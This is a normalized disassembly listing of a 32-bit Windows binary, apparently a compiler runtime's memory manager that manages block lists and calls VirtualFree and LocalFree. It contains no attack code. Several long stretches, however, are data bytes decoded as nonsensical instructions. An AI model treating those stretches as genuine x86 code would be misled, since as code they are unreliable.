sub_401092
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
or al 0x58
inc eax
add [ eax ] bl
pop eax
inc eax
add ah ch
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
and eax __import_lookup_table_0(kernel32:GetStdHandle)
mov eax eax
jmp [ __import_lookup_table_0(kernel32:RaiseException) ]
inc eax
add [ eax ] ch
pop eax
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x11004031 ] al
push esp
dec ecx
outsb
je r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edi ] al
sar bh 0x25
jb r-xdata
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
xor cl 0x47
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ ebx + 0x7c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x7825ffc0 ] cl
int1
inc edi
add [ ebx + 0x7425ffc0 ] cl
int1
inc edi
add [ ebx + 0x7025ffc0 ] cl
int1
inc edi
add [ ebx + 0x6c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x6825ffc0 ] cl
int1
inc edi
add [ ebx + 0x6425ffc0 ] cl
int1
inc edi
add [ ebx + 0x6025ffc0 ] cl
int1
inc edi
add [ ebx + 0x5c25ffc0 ] cl
int1
inc edi
add [ ebx - 0x57da0040 ] cl
int1
inc edi
add [ ebx + 0x5825ffc0 ] cl
int1
inc edi
add [ ebx + 0x5425ffc0 ] cl
int1
inc edi
add [ ebx + 0x5025ffc0 ] cl
int1
inc edi
add [ ebx - 0x3fda0040 ] cl
int1
inc edi
add [ ebx - 0x43da0040 ] cl
int1
inc edi
add [ ebx - 0x47da0040 ] cl
int1
inc edi
add [ ebx + 0x4c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x4825ffc0 ] cl
int1
inc edi
add [ ebx - 0x2fda0040 ] cl
int1
inc edi
add [ ebx - 0x33da0040 ] cl
int1
inc edi
add [ ebx - 0x37da0040 ] cl
int1
inc edi
add [ ebx + 0x4425ffc0 ] cl
int1
inc edi
add [ ebx + 0x4025ffc0 ] cl
int1
inc edi
add [ ebx + 0x3c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x3825ffc0 ] cl
int1
inc edi
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
push esp
imul ebp [ ebp + 0x65 ] 0x9c25ff01
int1
inc edi
add [ ebx - 0x67da0040 ] cl
int1
inc edi
add [ ebx - 0x6bda0040 ] cl
int1
inc edi
add [ ebx - 0x6fda0040 ] cl
int1
inc edi
add [ ebx - 0x73da0040 ] cl
int1
inc edi
add [ ebx - 0x4fda0040 ] cl
int1
inc edi
add [ ebx - 0x77da0040 ] cl
int1
inc edi
add [ ebx - 0x53da0040 ] cl
int1
inc edi
add [ ebx - 0x7bda0040 ] cl
int1
inc edi
add [ ebx - 0x7fda0040 ] cl
int1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ ebx ]
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40511c
xor eax [ eax ]
loopne r-xdata
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x7004031 ] al
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403244
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
or al 0x58
inc eax
add [ eax ] bl
pop eax
inc eax
add ah ch
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
and eax __import_lookup_table_0(kernel32:GetStdHandle)
mov eax eax
jmp [ __import_lookup_table_0(kernel32:RaiseException) ]
inc eax
add [ eax ] ch
pop eax
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x11004031 ] al
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
xor cl 0x47
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
add [ ebx + 0x7c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x7825ffc0 ] cl
int1
inc edi
add [ ebx + 0x7425ffc0 ] cl
int1
inc edi
add [ ebx + 0x7025ffc0 ] cl
int1
inc edi
add [ ebx + 0x6c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x6825ffc0 ] cl
int1
inc edi
add [ ebx + 0x6425ffc0 ] cl
int1
inc edi
add [ ebx + 0x6025ffc0 ] cl
int1
inc edi
add [ ebx + 0x5c25ffc0 ] cl
int1
inc edi
add [ ebx - 0x57da0040 ] cl
int1
inc edi
add [ ebx + 0x5825ffc0 ] cl
int1
inc edi
add [ ebx + 0x5425ffc0 ] cl
int1
inc edi
add [ ebx + 0x5025ffc0 ] cl
int1
inc edi
add [ ebx - 0x3fda0040 ] cl
int1
inc edi
add [ ebx - 0x43da0040 ] cl
int1
inc edi
add [ ebx - 0x47da0040 ] cl
int1
inc edi
add [ ebx + 0x4c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x4825ffc0 ] cl
int1
inc edi
add [ ebx - 0x2fda0040 ] cl
int1
inc edi
add [ ebx - 0x33da0040 ] cl
int1
inc edi
add [ ebx - 0x37da0040 ] cl
int1
inc edi
add [ ebx + 0x4425ffc0 ] cl
int1
inc edi
add [ ebx + 0x4025ffc0 ] cl
int1
inc edi
add [ ebx + 0x3c25ffc0 ] cl
int1
inc edi
add [ ebx + 0x3825ffc0 ] cl
int1
inc edi
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
push esp
imul ebp [ ebp + 0x65 ] 0x9c25ff01
int1
inc edi
add [ ebx - 0x67da0040 ] cl
int1
inc edi
add [ ebx - 0x6bda0040 ] cl
int1
inc edi
add [ ebx - 0x6fda0040 ] cl
int1
inc edi
add [ ebx - 0x73da0040 ] cl
int1
inc edi
add [ ebx - 0x4fda0040 ] cl
int1
inc edi
add [ ebx - 0x77da0040 ] cl
int1
inc edi
add [ ebx - 0x53da0040 ] cl
int1
inc edi
add [ ebx - 0x7bda0040 ] cl
int1
inc edi
add [ ebx - 0x7fda0040 ] cl
int1
inc edi
sub_401390
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401350
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013e8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401390
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401430
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013e8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013e8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401534
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401598
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401360
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401610
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401418
mov [ rw-data ] 0x1
sub_4016c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401360
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40175c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401534
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016c8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401430
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401610
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401418
jmp r-xdata
sub_40186c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016c8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
sub_401990
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40175c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401610
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014a0
jmp r-xdata
sub_401a1c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ad2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401370
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
push 0xff8
push 0x0
call sub_401350
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ad9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401380
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ae0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bb6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401378
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401388
retn
push rw-data
call sub_401380
sub_401bc0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c24
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c54
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e28
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401ca8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c84
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cd0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bc0
add ebx esi
mov [ rw-data ] 0x6
sub_401d40
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bc0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c24
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401990
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401990
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c54
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014a0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401ca8
sub_401e28
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d78
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401eb0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c84
